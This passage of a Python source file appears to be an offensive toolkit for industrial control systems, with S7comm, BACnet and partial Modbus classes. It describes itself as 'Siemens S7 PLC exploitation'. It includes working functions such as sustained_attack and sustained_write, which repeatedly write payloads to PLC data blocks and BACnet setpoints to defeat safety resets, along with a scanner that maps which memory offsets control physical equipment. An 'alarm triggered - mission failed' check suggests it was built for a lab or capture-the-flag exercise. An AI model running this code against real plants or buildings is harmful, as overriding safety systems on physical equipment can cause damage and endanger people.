            Block size in bytes
        """
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected"}
        
        try:
            info = self._client.get_block_info(0x41, db_number)  # 0x41 = DB
            
            return {
                "success": True,
                "db_number": db_number,
                "size": info.SizeData,
                "load_size": info.LoadSize,
                "local_data": info.LocalData,
                "mc7_size": info.MC7Size
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "db_number": db_number
            }
    
    # =========================================================================
    # AREA OPERATIONS (Advanced)
    # =========================================================================
    
    def read_area(self, area: str, db_number: int = 0, 
                  start: int = 0, size: int = 100) -> Dict[str, Any]:
        """
        Read from a memory area.
        
        Args:
            area: Memory area - "DB", "PE", "PA", "MK", "CT", "TM"
            db_number: DB number (only for area="DB")
            start: Start byte offset
            size: Number of bytes to read
        
        Returns:
            Read data
        """
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected"}
        
        try:
            from snap7 import Area
            
            area_map = {
                "DB": Area.DB,      # 0x84
                "PE": Area.PE,      # 0x81 - Process Inputs
                "PA": Area.PA,      # 0x82 - Process Outputs
                "MK": Area.MK,      # 0x83 - Markers
                "CT": Area.CT,      # 0x1C - Counters
                "TM": Area.TM       # 0x1D - Timers
            }
            
            area_code = area_map.get(area.upper())
            if area_code is None:
                return {
                    "success": False,
                    "error": f"Unknown area: {area}",
                    "valid_areas": list(area_map.keys())
                }
            
            data = self._client.read_area(area_code, db_number, start, size)
            
            return {
                "success": True,
                "area": area,
                "db_number": db_number if area.upper() == "DB" else None,
                "start": start,
                "size": len(data),
                "data_hex": data.hex().upper(),
                "data_bytes": list(data)
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def write_area(self, area: str, db_number: int = 0, 
                   start: int = 0, 
                   data: Union[str, bytes, List[int]] = None) -> Dict[str, Any]:
        """
        Write to a memory area.
        
        Args:
            area: Memory area - "DB", "PE", "PA", "MK"
            db_number: DB number (only for area="DB")
            start: Start byte offset
            data: Data to write (hex string, bytes, or list)
        
        Returns:
            Write result
        """
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected"}
        
        if data is None:
            return {"success": False, "error": "No data provided"}
        
        # Convert data to bytes
        try:
            if isinstance(data, str):
                data = bytes.fromhex(data.replace(" ", ""))
            elif isinstance(data, list):
                data = bytes(data)
        except Exception as e:
            return {"success": False, "error": f"Invalid data format: {e}"}
        
        try:
            from snap7 import Area
            
            area_map = {
                "DB": Area.DB,
                "PE": Area.PE,
                "PA": Area.PA,
                "MK": Area.MK
            }
            
            area_code = area_map.get(area.upper())
            if area_code is None:
                return {
                    "success": False,
                    "error": f"Unknown area: {area}",
                    "valid_areas": list(area_map.keys())
                }
            
            self._client.write_area(area_code, db_number, start, data)
            
            return {
                "success": True,
                "area": area,
                "db_number": db_number if area.upper() == "DB" else None,
                "start": start,
                "bytes_written": len(data)
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    # =========================================================================
    # SUSTAINED ATTACK TOOLS
    # =========================================================================
    
    def sustained_attack(self, db_number: int, offset: int, data: str,
                         duration_seconds: int = 60, interval_ms: int = 200,
                         status_url: str = None) -> Dict[str, Any]:
        """
        Continuously write payload to maintain state conditions.
        Useful for ICS testing where safety systems auto-reset values.
        
        Args:
            db_number: Data block number to write to
            offset: Byte offset in the data block
            data: Hex string payload (e.g., "FF" * 128)
            duration_seconds: How long to sustain writes (default 60)
            interval_ms: Milliseconds between writes (default 200)
            status_url: Optional HMI/API URL to poll for status monitoring
        
        Returns:
            Write statistics and status history if URL provided
        """
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected to PLC"}
        
        # Convert hex string to bytes
        try:
            payload = bytes.fromhex(data.replace(" ", ""))
        except Exception as e:
            return {"success": False, "error": f"Invalid hex data: {e}"}
        
        results = {
            "success": True,
            "writes_performed": 0,
            "write_errors": 0,
            "duration_seconds": duration_seconds,
            "interval_ms": interval_ms,
            "status_history": []
        }
        
        start_time = time.time()
        interval_sec = interval_ms / 1000.0
        iteration = 0
        
        while (time.time() - start_time) < duration_seconds:
            # Write payload
            try:
                self._client.db_write(db_number, offset, payload)
                results["writes_performed"] += 1
            except Exception as e:
                results["write_errors"] += 1
                # Try to reconnect
                if self._connection_info:
                    try:
                        self._client.connect(
                            self._connection_info["ip"],
                            self._connection_info["rack"],
                            self._connection_info["slot"],
                            self._connection_info["port"]
                        )
                    except:
                        pass
            
            # Check status if URL provided (every 5 iterations)
            if status_url and REQUESTS_AVAILABLE and iteration % 5 == 0:
                try:
                    resp = requests.get(status_url, timeout=2)
                    status = resp.json()
                    results["status_history"].append({
                        "iteration": iteration,
                        "elapsed": round(time.time() - start_time, 2),
                        "status": status
                    })
                except Exception:
                    pass
            
            iteration += 1
            time.sleep(interval_sec)
        
        results["elapsed_seconds"] = round(time.time() - start_time, 2)
        return results
    
    def sustained_attack_multi(self, db_number: int, writes: List[Dict],
                               duration_seconds: int = 60, interval_ms: int = 200,
                               status_url: str = None) -> Dict[str, Any]:
        """
        Continuously write multiple payloads to multiple offsets.
        Useful for ICS testing requiring simultaneous state changes.
        
        Args:
            db_number: Data block number to write to
            writes: List of write operations, each with {"offset": int, "data": str}
                    Example: [{"offset": 32, "data": "00FF"}, {"offset": 48, "data": "00FF"}]
            duration_seconds: How long to sustain writes (default 60)
            interval_ms: Milliseconds between write cycles (default 200)
            status_url: Optional HMI/API URL to poll for status monitoring
        
        Returns:
            Write statistics and status history if URL provided
        """
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected to PLC"}
        
        # Parse and validate writes
        parsed_writes = []
        for i, w in enumerate(writes):
            if not isinstance(w, dict) or 'offset' not in w or 'data' not in w:
                return {"success": False, "error": f"Invalid write at index {i}: must have 'offset' and 'data'"}
            try:
                offset = int(w['offset'])
                payload = bytes.fromhex(str(w['data']).replace(" ", ""))
                parsed_writes.append((offset, payload))
            except Exception as e:
                return {"success": False, "error": f"Invalid write at index {i}: {e}"}
        
        if not parsed_writes:
            return {"success": False, "error": "No writes provided"}
        
        results = {
            "success": True,
            "writes_performed": 0,
            "write_errors": 0,
            "write_count_per_cycle": len(parsed_writes),
            "duration_seconds": duration_seconds,
            "interval_ms": interval_ms,
            "status_history": []
        }
        
        start_time = time.time()
        interval_sec = interval_ms / 1000.0
        iteration = 0
        
        while (time.time() - start_time) < duration_seconds:
            # Write all payloads in rapid succession
            cycle_errors = 0
            for offset, payload in parsed_writes:
                try:
                    self._client.db_write(db_number, offset, payload)
                    results["writes_performed"] += 1
                except Exception as e:
                    cycle_errors += 1
                    results["write_errors"] += 1
                    # Try to reconnect on error
                    if self._connection_info:
                        try:
                            self._client.connect(
                                self._connection_info["ip"],
                                self._connection_info["rack"],
                                self._connection_info["slot"],
                                self._connection_info["port"]
                            )
                        except:
                            pass
            
            # Check status if URL provided (every 3 iterations to reduce overhead)
            if status_url and REQUESTS_AVAILABLE and iteration % 3 == 0:
                try:
                    resp = requests.get(status_url, timeout=2)
                    status = resp.json()
                    results["status_history"].append({
                        "iteration": iteration,
                        "elapsed": round(time.time() - start_time, 2),
                        "status": status
                    })
                except Exception:
                    pass
            
            iteration += 1
            time.sleep(interval_sec)
        
        results["elapsed_seconds"] = round(time.time() - start_time, 2)
        return results
    
    def db_write_typed(self, db_number: int, offset: int, value: Any,
                       data_type: str = "BYTE") -> Dict[str, Any]:
        """
        Write value with proper S7 data type encoding.
        Handles signed/unsigned conversion properly for PLC communication.
        
        Args:
            db_number: Data block number
            offset: Byte offset in the data block
            value: Value to write (will be converted based on data_type)
            data_type: S7 data type - BOOL, BYTE, SINT, INT, DINT, UINT, UDINT, REAL, STRING
        
        Returns:
            Write result with encoded value
        
        Supported Data Types:
            - BOOL: Boolean (1 bit, stored as byte with bit position)
            - BYTE: Unsigned 8-bit (0-255)
            - SINT: Signed 8-bit (-128 to 127)
            - INT: Signed 16-bit big-endian (-32768 to 32767)
            - DINT: Signed 32-bit big-endian
            - UINT: Unsigned 16-bit big-endian (0-65535)
            - UDINT: Unsigned 32-bit big-endian
            - REAL: 32-bit float big-endian
            - STRING: S7 string (length prefixed)
        """
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected to PLC"}
        
        import struct
        
        data_type = data_type.upper()
        
        try:
            if data_type == "BOOL":
                # BOOL is stored as a byte; value should be 0 or 1
                byte_val = 1 if value else 0
                payload = bytes([byte_val])
                
            elif data_type == "BYTE":
                # Unsigned 8-bit
                byte_val = int(value) & 0xFF
                payload = bytes([byte_val])
                
            elif data_type == "SINT":
                # Signed 8-bit
                payload = struct.pack('>b', int(value))
                
            elif data_type == "INT":
                # Signed 16-bit big-endian
                payload = struct.pack('>h', int(value))
                
            elif data_type == "UINT":
                # Unsigned 16-bit big-endian
                payload = struct.pack('>H', int(value))
                
            elif data_type == "DINT":
                # Signed 32-bit big-endian
                payload = struct.pack('>i', int(value))
                
            elif data_type == "UDINT":
                # Unsigned 32-bit big-endian
                payload = struct.pack('>I', int(value))
                
            elif data_type == "REAL":
                # 32-bit float big-endian
                payload = struct.pack('>f', float(value))
                
            elif data_type == "STRING":
                # S7 string format: max_len (1 byte) + actual_len (1 byte) + chars
                str_val = str(value)
                max_len = min(254, len(str_val) + 2)
                actual_len = len(str_val)
                payload = bytes([max_len, actual_len]) + str_val.encode('ascii', errors='replace')
                
            else:
                return {
                    "success": False,
                    "error": f"Unknown data type: {data_type}",
                    "valid_types": ["BOOL", "BYTE", "SINT", "INT", "UINT", "DINT", "UDINT", "REAL", "STRING"]
                }
            
            # Write to PLC
            self._client.db_write(db_number, offset, payload)
            
            return {
                "success": True,
                "db_number": db_number,
                "offset": offset,
                "value": value,
                "data_type": data_type,
                "bytes_written": len(payload),
                "data_hex": payload.hex().upper()
            }
            
        except struct.error as e:
            return {"success": False, "error": f"Value out of range for {data_type}: {e}"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def monitor_status(self, status_url: str, interval_ms: int = 500,
                       duration_seconds: int = 30) -> Dict[str, Any]:
        """
        Poll an HMI/API endpoint for status changes.
        Useful for observing effects of PLC writes.
        
        Args:
            status_url: URL to poll (e.g., http://target:port/status)
            interval_ms: Polling interval in milliseconds
            duration_seconds: How long to monitor
        
        Returns:
            Status history and changes observed during monitoring
        """
        if not REQUESTS_AVAILABLE:
            return {"success": False, "error": "requests library not installed", "install": "pip install requests"}
        
        results = {
            "success": True,
            "polls_performed": 0,
            "status_changes": [],
            "status_history": [],
            "initial_status": None,
            "final_status": None
        }
        
        start_time = time.time()
        interval_sec = interval_ms / 1000.0
        last_status = None
        
        while (time.time() - start_time) < duration_seconds:
            try:
                resp = requests.get(status_url, timeout=2)
                status = resp.json()
                results["polls_performed"] += 1
                results["final_status"] = status
                
                if results["initial_status"] is None:
                    results["initial_status"] = status
                
                # Record status sample
                results["status_history"].append({
                    "elapsed": round(time.time() - start_time, 2),
                    "status": status
                })
                
                # Check for changes
                if last_status is not None:
                    changes = {}
                    for key, val in status.items():
                        if key in last_status and last_status[key] != val:
                            changes[key] = {"from": last_status[key], "to": val}
                    if changes:
                        results["status_changes"].append({
                            "elapsed": round(time.time() - start_time, 2),
                            "changes": changes
                        })
                
                last_status = status.copy()
                
            except Exception as e:
                results["last_error"] = str(e)
            
            time.sleep(interval_sec)
        
        results["elapsed_seconds"] = round(time.time() - start_time, 2)
        return results
    
    def scan_db_effects(self, db_number: int, status_url: str,
                        start_offset: int = 0, end_offset: int = 128,
                        test_value: str = "FF") -> Dict[str, Any]:
        """
        Systematically write to each byte offset and observe HMI changes.
        Maps which DB offsets control which equipment/parameters.
        
        Args:
            db_number: Data block to scan
            status_url: HMI URL to observe changes
            start_offset: Starting byte offset
            end_offset: Ending byte offset
            test_value: Hex value to write (default "FF")
        
        Returns:
            Map of offsets to their observed effects
        """
        if not self._client or not self._client.get_connected():
            return {"success": False, "error": "Not connected to PLC"}
        
        if not REQUESTS_AVAILABLE:
            return {"success": False, "error": "requests library not installed"}
        
        results = {
            "success": True,
            "db_number": db_number,
            "offsets_tested": 0,
            "effects_found": {},
            "offset_map": {}
        }
        
        # Get baseline status
        try:
            baseline = requests.get(status_url, timeout=2).json()
        except Exception as e:
            return {"success": False, "error": f"Cannot reach status URL: {e}"}
        
        test_byte = bytes.fromhex(test_value)
        
        for offset in range(start_offset, end_offset):
            # Read original value
            try:
                original = self._client.db_read(db_number, offset, 1)
            except:
                original = b'\x00'
            
            # Write test value
            try:
                self._client.db_write(db_number, offset, test_byte)
                time.sleep(0.3)  # Wait for effect
                
                # Check status
                try:
                    new_status = requests.get(status_url, timeout=2).json()
                    
                    # Compare with baseline
                    changes = {}
                    for key, val in new_status.items():
                        if key in baseline and baseline[key] != val:
                            changes[key] = {"baseline": baseline[key], "after_write": val}
                    
                    if changes:
                        results["effects_found"][offset] = changes
                        results["offset_map"][offset] = list(changes.keys())
                    
                except Exception:
                    pass
                
                # Restore original value
                self._client.db_write(db_number, offset, original)
                
            except Exception as e:
                results[f"error_offset_{offset}"] = str(e)
            
            results["offsets_tested"] += 1
        
        return results
    
    def generate_payload(self, pattern: str = "all_max", size: int = 128) -> Dict[str, Any]:
        """
        Generate common payload patterns for ICS testing.
        
        Args:
            pattern: Pattern type:
                     - "all_max" (0xFF), "all_min" (0x00), "all_mid" (0x80)
                     - "alternating" (0xFF00FF00...)
                     - "incremental" (0x00, 0x01, 0x02...)
                     - "random"
            size: Number of bytes to generate
        
        Returns:
            Generated payload as hex string
        """
        if pattern == "all_max":
            payload = "FF" * size
        elif pattern == "all_min":
            payload = "00" * size
        elif pattern == "all_mid":
            payload = "80" * size
        elif pattern == "alternating":
            payload = "FF00" * (size // 2)
        elif pattern == "incremental":
            payload = "".join(f"{i % 256:02X}" for i in range(size))
        elif pattern == "random":
            payload = "".join(f"{random.randint(0, 255):02X}" for _ in range(size))
        else:
            return {
                "success": False,
                "error": f"Unknown pattern: {pattern}",
                "available_patterns": ["all_max", "all_min", "all_mid", "alternating", "incremental", "random"]
            }
        
        return {
            "success": True,
            "pattern": pattern,
            "size": size,
            "payload": payload,
            "usage": f"db_write(db_number, offset, '{payload[:20]}...')"
        }
    
    # =========================================================================
    # UTILITY METHODS
    # =========================================================================
    
    def check_installation(self) -> Dict[str, Any]:
        """Check if python-snap7 is installed and working"""
        result = {
            "protocol": "S7comm",
            "installed": False,
            "version": None,
            "path": None,
            "working": False,
            "installation_instructions": {
                "pip": "pip install python-snap7",
                "conda": "conda install -c conda-forge python-snap7"
            }
        }
        
        if SNAP7_AVAILABLE:
            result["installed"] = True
            result["path"] = snap7.__file__
            
            try:
                result["version"] = snap7.__version__
            except AttributeError:
                result["version"] = "unknown"
            
            try:
                client = snap7.client.Client()
                result["working"] = True
            except Exception as e:
                result["working"] = False
                result["client_error"] = str(e)
        
        return result
    
    def get_documentation(self, topic: str = "general") -> Dict[str, Any]:
        """Get usage documentation and examples"""
        docs = {
            "protocol": "S7comm",
            "official_docs": self.official_docs,
            "topic": topic
        }
        
        if topic == "general":
            docs["quick_reference"] = """
S7comm PLC Toolkit - Siemens S7 PLC exploitation.

QUICK START:
1. connect("192.168.1.1", rack=0, slot=0, port=102)
2. db_read(db_number=1, offset=0, size=100)
3. db_write(db_number=1, offset=0, data="FF00FF00")
4. disconnect()

KEY NOTES:
- 4th param to connect() is TCP port (some systems use non-standard ports)
- Data can be hex string ("FF00") or bytes
- Use db_get_size() to find data block sizes
- Some systems need sustained writes to maintain state (use sustained_attack)
"""
            docs["common_patterns"] = {
                "connect_non_standard_port": "connect('target', 0, 0, 36815)",
                "read_db1": "db_read(1, 0, 100)",
                "write_extreme_values": "db_write(1, 48, 'FF' * 8)",
                "sustained_attack": "sustained_attack(1, 0, 'FF'*128, duration_seconds=60)"
            }
        
        elif topic == "areas":
            docs["memory_areas"] = {
                "DB": "Data Blocks - 0x84",
                "PE": "Process Inputs - 0x81",
                "PA": "Process Outputs - 0x82",
                "MK": "Markers/Flags - 0x83",
                "CT": "Counters - 0x1C",
                "TM": "Timers - 0x1D"
            }
        
        return docs
    
    def list_capabilities(self) -> Dict[str, Any]:
        """List all tools provided by this toolkit"""
        return {
            "protocol": "S7comm",
            "version": self.version,
            "tools": [
                {"name": "connect", "description": "Connect to PLC"},
                {"name": "disconnect", "description": "Disconnect from PLC"},
                {"name": "is_connected", "description": "Check connection status"},
                {"name": "get_cpu_info", "description": "Get CPU module information"},
                {"name": "get_cpu_state", "description": "Get CPU run state"},
                {"name": "list_blocks", "description": "List all data blocks"},
                {"name": "db_read", "description": "Read from data block"},
                {"name": "db_write", "description": "Write to data block"},
                {"name": "db_get_size", "description": "Get data block size"},
                {"name": "read_area", "description": "Read from memory area"},
                {"name": "write_area", "description": "Write to memory area"},
                {"name": "sustained_attack", "description": "Continuously write payload"},
                {"name": "monitor_status", "description": "Poll HMI/API for status"},
                {"name": "scan_db_effects", "description": "Map DB offsets to effects"},
                {"name": "generate_payload", "description": "Generate payload patterns"},
            ]
        }


# =============================================================================
# BACNET TOOLKIT
# =============================================================================

class BACnetToolkit:
    """
    BACnet Building Automation Toolkit for ICS security assessment.
    
    BACnet (Building Automation and Control Networks) is used for HVAC,
    lighting, access control, and fire detection systems.
    
    This toolkit interfaces with menu-driven BACnet CLI servers commonly
    found in building automation systems. The CLI format is:
        1. objects
        2. bacnet.read
        3. bacnet.write
        >>
    
    Object Types:
        - analogInput: Sensor values (temperature) - Read-only
        - analogOutput: Setpoints (thermostat, alarms) - Read/Write
        - binaryInput: Status flags - Read-only
        - binaryOutput: Control switches (AC on/off) - Read/Write
        - multiStateInput: Multi-value status - Read-only
        - multiStateOutput: Multi-value control (door locks) - Read/Write
    
    Example:
        toolkit = BACnetToolkit()
        toolkit.connect("192.168.1.1", 48103)
        
        # List all objects
        objects = toolkit.list_objects()
        
        # Read temperature
        temp = toolkit.read("analogInput", 20, "presentValue")
        
        # Set thermostat
        toolkit.write("analogOutput", 21, "presentValue", 100)
        
        # Persistent write attack (bypass safety reset)
        result = toolkit.sustained_write("analogOutput", 21, "presentValue", 100,
                                         duration_seconds=120, interval_seconds=2.0,
                                         status_url="http://target:8080/data")
    """
    
    # Valid BACnet object types
    OBJECT_TYPES = {
        "analogInput": {"access": "read", "description": "Sensor values"},
        "analogOutput": {"access": "read/write", "description": "Setpoints"},
        "binaryInput": {"access": "read", "description": "Status flags"},
        "binaryOutput": {"access": "read/write", "description": "Control switches"},
        "multiStateInput": {"access": "read", "description": "Multi-value status"},
        "multiStateOutput": {"access": "read/write", "description": "Multi-value control"},
    }
    
    def __init__(self):
        """Initialize BACnet toolkit"""
        self.sock = None
        self.host = None
        self.port = None
        self.timeout = 10
        self.connected = False
    
    def connect(self, host: str, port: int, timeout: int = 10) -> Dict[str, Any]:
        """
        Connect to BACnet CLI server.
        
        Args:
            host: Target IP address
            port: BACnet CLI port
            timeout: Connection timeout in seconds
        
        Returns:
            Dict with success status and banner info
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(timeout)
            self.sock.connect((host, port))
            
            # Read banner/menu
            banner = self._recv_all()
            
            self.host = host
            self.port = port
            self.timeout = timeout
            self.connected = True
            
            return {
                "success": True,
                "connected": True,
                "host": host,
                "port": port,
                "banner": banner.strip() if banner else ""
            }
        except socket.timeout:
            return {"success": False, "error": "Connection timeout"}
        except ConnectionRefusedError:
            return {"success": False, "error": "Connection refused"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def disconnect(self) -> Dict[str, Any]:
        """Close connection to BACnet CLI server"""
        try:
            if self.sock:
                self.sock.close()
            self.sock = None
            self.connected = False
            return {"success": True, "disconnected": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _recv_all(self, timeout: float = 0.5) -> str:
        """Receive all available data from socket"""
        self.sock.setblocking(False)
        data = b""
        end_time = time.time() + timeout
        
        while time.time() < end_time:
            try:
                chunk = self.sock.recv(4096)
                if chunk:
                    data += chunk
                else:
                    break
            except BlockingIOError:
                time.sleep(0.05)
            except Exception:
                break
        
        self.sock.setblocking(True)
        self.sock.settimeout(self.timeout)
        return data.decode('utf-8', errors='replace')
    
    def _send_command(self, menu_option: str, command: str = None) -> str:
        """
        Send command to BACnet CLI.
        
        Args:
            menu_option: Menu selection (1, 2, or 3)
            command: Optional command arguments
        
        Returns:
            Response string from server
        """
        if not self.connected or not self.sock:
            raise ConnectionError("Not connected to BACnet server")
        
        try:
            # Create new connection for each command (CLI is menu-driven)
            self.sock.close()
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))
            
            # Read initial menu
            self._recv_all(0.3)
            
            # Send menu selection
            self.sock.send(f"{menu_option}\n".encode())
            time.sleep(0.1)
            
            # Read response/prompt
            response = self._recv_all(0.3)
            
            # If command provided, send it
            if command:
                self.sock.send(f"{command}\n".encode())
                time.sleep(0.1)
                response = self._recv_all(0.5)
            
            return response
            
        except Exception as e:
            raise ConnectionError(f"Command failed: {str(e)}")
    
    def list_objects(self) -> Dict[str, Any]:
        """
        List all BACnet objects (menu option 1).
        
        Returns:
            Dict with success status and list of objects
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        try:
            response = self._send_command("1")
            
            # Parse object list from response
            objects = []
            lines = response.split('\n')
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                # Try to parse object info
                # Format varies but typically: "ObjectName - ID - Type - Description"
                # Or: "analogInput:20 - Temp-L2-20 - Temperature sensor"
                for obj_type in self.OBJECT_TYPES:
                    if obj_type in line.lower() or obj_type.lower() in line.lower():
                        objects.append({
                            "raw": line,
                            "type_hint": obj_type
                        })
                        break
                else:
                    # Include line if it looks like object data
                    if any(char.isdigit() for char in line) and '-' in line:
                        objects.append({"raw": line})
            
            return {
                "success": True,
                "raw_response": response,
                "objects": objects,
                "object_count": len(objects)
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def read(self, object_type: str, object_id: int, 
             property_name: str = "presentValue") -> Dict[str, Any]:
        """
        Read BACnet object property (menu option 2).
        
        Args:
            object_type: BACnet object type (e.g., "analogInput")
            object_id: Object instance ID
            property_name: Property to read (default: "presentValue")
        
        Returns:
            Dict with success status and property value
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        try:
            command = f"{object_type} {object_id} {property_name}"
            response = self._send_command("2", command)
            
            # Parse value from response
            value = None
            
            # Look for numeric values
            numbers = re.findall(r'[-+]?\d*\.?\d+', response)
            if numbers:
                try:
                    value = float(numbers[-1])
                    if value == int(value):
                        value = int(value)
                except ValueError:
                    pass
            
            # Look for True/False
            if 'true' in response.lower():
                value = True
            elif 'false' in response.lower():
                value = False
            
            return {
                "success": True,
                "object_type": object_type,
                "object_id": object_id,
                "property": property_name,
                "value": value,
                "raw_response": response.strip()
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def write(self, object_type: str, object_id: int, 
              property_name: str, value: Any) -> Dict[str, Any]:
        """
        Write BACnet object property (menu option 3).
        
        Args:
            object_type: BACnet object type (e.g., "analogOutput")
            object_id: Object instance ID
            property_name: Property to write (typically "presentValue")
            value: Value to write
        
        Returns:
            Dict with success status
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        # Validate object type is writable
        if object_type in self.OBJECT_TYPES:
            if self.OBJECT_TYPES[object_type]["access"] == "read":
                return {
                    "success": False, 
                    "error": f"{object_type} is read-only"
                }
        
        try:
            command = f"{object_type} {object_id} {property_name} {value}"
            response = self._send_command("3", command)
            
            # Check for success indicators
            success = True
            error_msg = None
            
            response_lower = response.lower()
            if 'failed' in response_lower or 'error' in response_lower:
                success = False
                error_msg = response.strip()
            elif 'alarm' in response_lower:
                success = False
                error_msg = "Alarm triggered - mission failed"
            
            return {
                "success": success,
                "object_type": object_type,
                "object_id": object_id,
                "property": property_name,
                "value_written": value,
                "raw_response": response.strip(),
                "error": error_msg
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def sustained_write(self, object_type: str, object_id: int,
                        property_name: str, value: Any,
                        duration_seconds: int = 120,
                        interval_seconds: float = 2.0,
                        status_url: str = None) -> Dict[str, Any]:
        """
        Continuously write a value to a BACnet object.
        
        Useful for maintaining a specific state when systems may auto-reset values.
        
        Args:
            object_type: BACnet object type (e.g., "analogOutput")
            object_id: Object instance ID
            property_name: Property to write (typically "presentValue")
            value: Value to write continuously
            duration_seconds: How long to sustain writes
            interval_seconds: Time between writes (default 2s)
            status_url: Optional HTTP endpoint to monitor for status
        
        Returns:
            Dict with writes_performed, write_errors, elapsed time, and status history
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        writes_performed = 0
        write_errors = 0
        start_time = time.time()
        status_history = []
        
        while time.time() - start_time < duration_seconds:
            # Write the value
            result = self.write(object_type, object_id, property_name, value)
            
            if result.get("success"):
                writes_performed += 1
            else:
                write_errors += 1
            
            # Check status if URL provided
            if status_url and REQUESTS_AVAILABLE:
                try:
                    resp = requests.get(status_url, timeout=3)
                    data = resp.json()
                    status_history.append({
                        "elapsed": round(time.time() - start_time, 2),
                        "status": data
                    })
                except Exception:
                    pass
            
            time.sleep(interval_seconds)
        
        elapsed = time.time() - start_time
        
        return {
            "success": writes_performed > 0,
            "writes_performed": writes_performed,
            "write_errors": write_errors,
            "duration_seconds": duration_seconds,
            "interval_seconds": interval_seconds,
            "elapsed_seconds": round(elapsed, 2),
            "status_history": status_history,
            "final_status": status_history[-1]["status"] if status_history else None
        }
    
    def find_writable(self) -> Dict[str, Any]:
        """
        Find all writable BACnet objects.
        
        Returns:
            Dict with list of writable objects and their current values
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        writable_types = [
            "analogOutput",
            "binaryOutput", 
            "multiStateOutput"
        ]
        
        # First list all objects
        objects_result = self.list_objects()
        if not objects_result.get("success"):
            return objects_result
        
        writable_objects = []
        raw_response = objects_result.get("raw_response", "")
        
        # Parse object IDs from response
        for obj_type in writable_types:
            # Look for patterns like "analogOutput:21" or "Therm-L2-21"
            pattern = rf'{obj_type}[:\s]+(\d+)'
            matches = re.findall(pattern, raw_response, re.IGNORECASE)
            
            for obj_id in matches:
                obj_id = int(obj_id)
                # Try to read current value
                read_result = self.read(obj_type, obj_id, "presentValue")
                writable_objects.append({
                    "object_type": obj_type,
                    "object_id": obj_id,
                    "current_value": read_result.get("value"),
                    "access": "read/write"
                })
        
        return {
            "success": True,
            "writable_objects": writable_objects,
            "count": len(writable_objects)
        }
    
    def write_multiple(self, writes: List[Dict]) -> Dict[str, Any]:
        """
        Write to multiple BACnet objects in a batch.
        
        Args:
            writes: List of write operations, each with:
                    {"object_type": str, "object_id": int, "property": str, "value": any}
                    Example: [{"object_type": "analogOutput", "object_id": 21, "property": "presentValue", "value": 100}]
        
        Returns:
            Dict with results for each write operation
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        if not writes or not isinstance(writes, list):
            return {"success": False, "error": "writes must be a non-empty list"}
        
        results = []
        success_count = 0
        
        for i, w in enumerate(writes):
            if not isinstance(w, dict):
                results.append({"index": i, "success": False, "error": "Invalid write format"})
                continue
            
            obj_type = w.get("object_type", "analogOutput")
            obj_id = w.get("object_id")
            prop = w.get("property", "presentValue")
            value = w.get("value")
            
            if obj_id is None or value is None:
                results.append({"index": i, "success": False, "error": "Missing object_id or value"})
                continue
            
            result = self.write(obj_type, obj_id, prop, value)
            results.append({
                "index": i,
                "object_type": obj_type,
                "object_id": obj_id,
                "property": prop,
                "value": value,
                "success": result.get("success", False),
                "response": result.get("raw_response", "")
            })
            if result.get("success"):
                success_count += 1
        
        return {
            "success": success_count > 0,
            "results": results,
            "success_count": success_count,
            "total_count": len(writes)
        }
    
    def get_capabilities(self) -> Dict[str, Any]:
        """Get BACnet toolkit capabilities"""
        return {
            "protocol": "BACnet",
            "description": "Building Automation and Control Networks toolkit",
            "object_types": self.OBJECT_TYPES,
            "methods": [
                {"name": "connect", "description": "Connect to BACnet CLI server"},
                {"name": "disconnect", "description": "Close connection"},
                {"name": "list_objects", "description": "Enumerate all objects"},
                {"name": "read", "description": "Read object property"},
                {"name": "write", "description": "Write object property"},
                {"name": "sustained_write", "description": "Continuous write operation"},
                {"name": "find_writable", "description": "Find all writable objects"},
                {"name": "write_multiple", "description": "Batch write multiple objects"},
            ]
        }


# =============================================================================
# MODBUS CLI TOOLKIT
# =============================================================================

class ModbusCLIToolkit:
    """
    Modbus CLI Toolkit for menu-driven Modbus interfaces.
    
    Many ICS systems expose Modbus via a text menu interface over TCP.
    This toolkit handles the menu navigation and Modbus command formatting.
    
    Modbus Function Codes:
        - 01: Read Coils
        - 02: Read Discrete Inputs
        - 03: Read Holding Registers
        - 04: Read Input Registers
        - 05: Write Single Coil (value: FF00=ON, 0000=OFF)
        - 06: Write Single Register
        - 0F: Write Multiple Coils
        - 10: Write Multiple Registers
    
    Example:
        toolkit = ModbusCLIToolkit()
        toolkit.connect("192.168.1.1", 502)
        
        # Get system status
        status = toolkit.get_status()
        
        # Write coil (turn ON)
        toolkit.write_coil(0, True)
        
        # Write register
        toolkit.write_register(0, 100)
    """
    
    def __init__(self):
        """Initialize Modbus CLI toolkit"""
        self.sock = None
        self.host = None
        self.port = None
        self.timeout = 10
        self.connected = False
        self.menu_status_option = "1"
        self.menu_command_option = "2"
    
    def connect(self, host: str, port: int, timeout: int = 10) -> Dict[str, Any]:
        """
        Connect to Modbus CLI server.
        
        Args:
            host: Target IP address
            port: Modbus CLI port
            timeout: Connection timeout in seconds
        
        Returns:
            Dict with success status and banner info
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(timeout)
            self.sock.connect((host, port))
            
